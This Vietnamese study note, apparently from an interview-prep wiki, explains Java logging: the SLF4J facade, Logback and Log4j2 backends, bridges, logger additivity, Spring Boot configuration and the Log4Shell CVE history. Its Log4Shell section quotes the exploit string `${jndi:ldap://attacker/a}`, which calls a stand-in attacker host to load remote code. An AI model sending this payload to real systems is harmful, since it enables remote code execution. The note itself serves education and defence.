## Quick

Code gọi một [[logging-facade|logging facade]] ([[slf4j|SLF4J]]); việc ghi do một implementation đảm nhận (Logback, Log4j2), chọn bằng jar trên classpath. **Thư viện chỉ phụ thuộc facade, ứng dụng chọn đúng một implementation, mọi API logging khác được bridge về facade đó.** Logger tạo thành cây theo tên package, và log đi ngược lên cây tới mọi appender của tổ tiên ([[logger-additivity|additivity]]).

## Interview

Java có nhiều API logging: JUL (`java.util.logging`, có sẵn trong JDK), Commons Logging (JCL), Log4j 1 (hết hỗ trợ từ 2015), Log4j2, SLF4J. Ứng dụng dùng hàng chục thư viện, mỗi cái gọi một API. Cách gom: chọn SLF4J làm facade, Logback hoặc Log4j2 làm backend, và thêm bridge (`jul-to-slf4j`, `jcl-over-slf4j`, `log4j-to-slf4j`) để mọi log chảy về một chỗ. Spring Boot làm sẵn: starter mặc định là Logback, có bridge cho JUL và Log4j API.

**SLF4J 2.x tìm backend bằng [[service-loader|`ServiceLoader`]]** (SLF4J 1.x dùng class `StaticLoggerBinder`). Không có provider: in `No SLF4J providers were found` và dùng NOP logger, **nuốt mọi log**. Nhiều provider: cảnh báo `Class path contains multiple SLF4J providers` và lấy cái tìm thấy đầu tiên, tuỳ thứ tự classpath. Trộn SLF4J 2 với binding kiểu 1.x cũng rơi về NOP.

**Cây logger**: logger `com.shop.order.OrderService` là con của `com.shop.order`, rồi `com.shop`, rồi root. Logger không đặt level thì kế thừa level của tổ tiên gần nhất. Mỗi event được gửi tới appender của logger đó **và** mọi tổ tiên, trừ khi đặt `additivity="false"`. Gắn cùng appender vào cả logger con và root là cách kinh điển để mỗi dòng log in hai lần.

**Ghép phiên bản**: SLF4J 1.7 đi với Logback 1.2 và `log4j-slf4j-impl`; SLF4J 2.x đi với Logback 1.3+ và `log4j-slf4j2-impl`. Lệch cặp (ví dụ ghi đè Logback về 1.2 trong project Spring Boot 3 dùng SLF4J 2) thì SLF4J không thấy provider và rơi về NOP. Fluent API lười (`log.atDebug()...`) chỉ có từ SLF4J 2; chi phí đối số và cách dùng nó ở bài Log cho production.

Logger khai báo `private static final Logger log = LoggerFactory.getLogger(OrderService.class);` để tên logger khớp class và lọc theo package được.

**[[log4shell|Log4Shell]]** (CVE-2021-44228, tháng 12/2021): `log4j-core` từ 2.0-beta9 tới 2.14.1 xử lý lookup `${...}` ngay trong message, kể cả chuỗi người dùng gửi lên. `${jndi:ldap://attacker/a}` làm server tự kết nối ra ngoài qua [[jndi|JNDI]] và có thể tải, chạy code của kẻ tấn công. Bài học: dữ liệu ghi vào log là đầu vào không tin cậy, và phải biết thư viện nào đang nằm trong classpath của mình.

## Deep

- **Đã chạy với SLF4J 2.0.17, Logback 1.5.18, Log4j 2.24.3 trên JDK 27**: thiếu provider in ba dòng `SLF4J(W)` rồi im lặng; có cả `slf4j-simple` và Logback thì cảnh báo nhiều provider và chọn `SimpleServiceProvider` đứng trước trong classpath; cùng appender gắn ở `com.shop.order` và root in mỗi dòng hai lần.
- **Vòng lặp bridge**: `log4j-slf4j2-impl` (SLF4J → Log4j2) và `log4j-to-slf4j` (Log4j API → SLF4J) cùng có mặt thì log chạy vòng. Log4j 2.24.3 tự phát hiện và ném `LoggingException: log4j-slf4j2-impl cannot be present with log4j-to-slf4j` khi khởi tạo. Tương tự `jcl-over-slf4j` với `slf4j-jcl`, `jul-to-slf4j` với `slf4j-jdk14`. Luôn exclude phía còn lại.
- **Đổi Spring Boot sang Log4j2**: exclude `spring-boot-starter-logging` khỏi mọi starter rồi thêm `spring-boot-starter-log4j2`. Sót một chỗ thì có hai provider trên classpath.
- **`logback-spring.xml` khác `logback.xml`**: file có hậu tố `-spring` được Spring Boot nạp sau khi môi trường sẵn sàng, nên dùng được `<springProfile>` và `<springProperty>`. `logback.xml` bị Logback nạp sớm hơn, trước khi Spring đọc `application.yml`.
- **JUL bridge có giá**: `SLF4JBridgeHandler` chuyển log JUL, nhưng kiểm tra level vẫn ở phía JUL; nếu JUL để mức thấp thì mọi lời gọi `fine()` vẫn tạo `LogRecord` rồi mới bị SLF4J bỏ. Logback có `LevelChangePropagator` để đồng bộ level sang JUL; Spring Boot cấu hình sẵn.
- **Chẩn đoán cấu hình**: dòng `Actual provider is of type [...]` cho biết SLF4J chọn backend nào; từ SLF4J 2.0.9 chỉ định được bằng `-Dslf4j.provider=<tên class provider>`. Logback in trạng thái nạp cấu hình với `<configuration debug="true">`, Log4j2 với `-Dlog4j2.debug`. Không có file cấu hình nào thì Logback ghi ra console ở DEBUG, Log4j2 chỉ ghi ERROR.
- **Logger có tên động** (`getLogger("tenant." + tenantId)`) tạo một logger mới cho mỗi tên và Logback giữ chúng mãi trong bộ nhớ. Đưa tenant vào [[mdc|MDC]] thay vì tên logger.
- **Log4Shell chi tiết**: ảnh hưởng `log4j-core` từ 2.0-beta9 tới 2.14.1. 2.15.0 hạn chế JNDI nhưng vẫn còn đường khai thác (CVE-2021-45046), 2.16.0 bỏ lookup trong message và tắt JNDI mặc định, 2.17.0 sửa lỗi đệ quy lookup gây DoS (CVE-2021-45105), 2.17.1 sửa lỗi qua cấu hình JDBC appender (CVE-2021-44832). Cờ `log4j2.formatMsgNoLookups=true` (từ 2.10) chỉ là giảm nhẹ chưa đủ. JDK từ 8u191 tắt `trustURLCodebase` nên không tải class từ xa qua LDAP, nhưng vẫn có thể bị khai thác qua deserialization gadget có sẵn trong classpath (bài Serialization & lỗ hổng deserialization).
- **Log4j 1.x** đã hết hỗ trợ và có lỗ hổng riêng (`JMSAppender`, `SocketServer`); Reload4j là bản fork vá lỗi để chuyển tiếp, đích đến vẫn là Logback hay Log4j2.
- **Chống giả dòng log**: chuỗi người dùng chứa `\n` có thể tạo dòng log giả; structured log JSON tự escape. Chi tiết và cách che dữ liệu nhạy cảm ở bài Log cho production.
